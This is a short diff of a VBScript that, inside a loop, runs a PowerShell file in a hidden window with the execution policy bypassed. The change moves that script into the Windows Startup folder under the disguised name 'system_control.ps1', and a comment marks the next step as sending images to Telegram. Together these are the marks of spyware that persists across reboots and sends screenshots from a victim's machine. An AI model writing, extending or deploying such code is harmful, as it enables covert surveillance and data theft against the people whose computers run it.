@@ -52,7 +52,7 @@ Do
     Set objShell = CreateObject("WScript.Shell")
     
     ' Chạy PowerShell script
-    Dim PS1File : PS1File = "C:\Users\Public\Public Sys\system_control.ps1"
+    Dim PS1File : PS1File = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Public Sys\system_control.ps1"
     objShell.Run "powershell -ExecutionPolicy Bypass -File """ & PS1File & """", 0, True
 
     ' Gửi ảnh đến Telegram
